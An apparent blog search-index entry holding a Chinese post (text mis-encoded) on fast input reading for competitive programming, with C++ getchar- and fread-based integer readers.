        <content type="html"><![CDATA[<p>æœ¬æ–‡ä¸»è¦è®²è¿°å¸¸ç”¨çš„2ç§è¯»å…¥ä¼˜åŒ–æ–¹æ³•ã€‚<br>è¾“å‡ºä¼˜åŒ–å¾ˆå°‘ä½¿ç”¨ï¼Œåœ¨æ­¤ç®€å•æä¸€ä¸‹ï¼šä¹Ÿå°±æ˜¯æŠŠè¾“å‡ºçš„ä¸œè¥¿å…ˆæ”¾è¿›å­—ç¬¦ä¸²ï¼Œå†ä¸€æ¬¡æ€§puts\printfå‡ºå»ã€‚æå‡ä¸å¤§ï¼Œä¸å¸¸ç”¨ã€‚<br>é¦–å…ˆå½“ç„¶éœ€è¦å…ˆçŸ¥é“ï¼Œscanf&#x2F;printfæ¯”cin&#x2F;coutå¿«ä¸å°‘ã€‚<br>è¯»å…¥ä¼˜åŒ–ï¼š </p><ol><li>getchar<br>ä½¿ç”¨getcharä¸€ä¸ªä¸€ä¸ªè¯»å…¥å­—ç¬¦ï¼Œè½¬åŒ–æˆæ•°å­—ã€‚æ¯”scanfå¿«ä¸€äº›ã€‚<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> f=<span class="number">1</span>,x=<span class="number">0</span>;<span class="comment">//fæ˜¯æ­£è´Ÿçš„æ ‡è¯†</span></span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        ch=<span class="built_in">getchar</span>();</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            f=<span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span>(ch&lt;<span class="string">&#x27;0&#x27;</span>||ch&gt;<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        x=x*<span class="number">10</span>+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=<span class="built_in">getchar</span>();</span><br><span class="line">    &#125; <span class="keyword">while</span>(ch&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> f*x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>2.fread  ï¼ˆéå¸¸å¿«ï¼ï¼‰<br>freadå°†stdiné‡Œçš„å†…å®¹è¯»åˆ°å­—ç¬¦ä¸²é‡Œï¼Œç„¶ååˆ©ç”¨æŒ‡é’ˆå¤„ç†ã€‚<br>é¦–å…ˆå®šä¹‰æŒ‡é’ˆå’Œè¯»å…¥çš„æ•°ç»„ï¼š  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXB 10000000</span></span><br><span class="line"><span class="comment">//å®šä¹‰è¯»å…¥æœ€é•¿çš„é•¿åº¦</span></span><br><span class="line">    <span class="type">char</span> buf[MAXB],*cp=buf;</span><br></pre></td></tr></table></figure>æ¥ä¸‹æ¥æ˜¯è¯»å…¥ï¼š  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fread</span>(buf,<span class="number">1</span>,MAXB,stdin);<span class="comment">//å‡½æ•°å…·ä½“å‚æ•°å«ä¹‰è¯·å–„ç”¨æœç´¢å¼•æ“</span></span><br></pre></td></tr></table></figure>æœ€åæ˜¯ä»ä¸­å¤„ç†å‡ºæ•°æ®ï¼ˆç°åœ¨è¿™ä¸ªå‡½æ•°æ˜¯ä¸ºäº†å¤„ç†intæ•´å‹è€Œè®¾è®¡ï¼‰  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> f=<span class="number">1</span>,x=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(*cp&lt;<span class="string">&#x27;0&#x27;</span>||*cp&gt;<span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(*cp==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            f=<span class="number">-1</span>;</span><br><span class="line">        cp++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(*cp&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;*cp&lt;=<span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        x=x*<span class="number">10</span>+*cp-<span class="string">&#x27;0&#x27;</span>; </span><br><span class="line">        cp++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f*x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
